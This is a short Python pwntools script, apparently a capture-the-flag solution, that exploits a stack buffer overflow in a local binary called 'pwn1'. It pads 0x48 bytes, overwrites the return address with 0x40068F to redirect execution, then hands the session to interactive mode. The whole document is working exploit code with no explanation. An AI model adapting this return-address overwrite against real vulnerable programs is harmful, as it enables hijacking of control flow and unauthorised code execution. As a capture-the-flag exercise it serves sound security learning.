from pwn import *

context(log_level="debug")

p = process('./pwn1')

p.recvuntil('\n')
vul_addr = 0x40068F
payload = 'a'*(0x40+8)+p64(vul_addr)
p.sendline(payload)
p.interactive()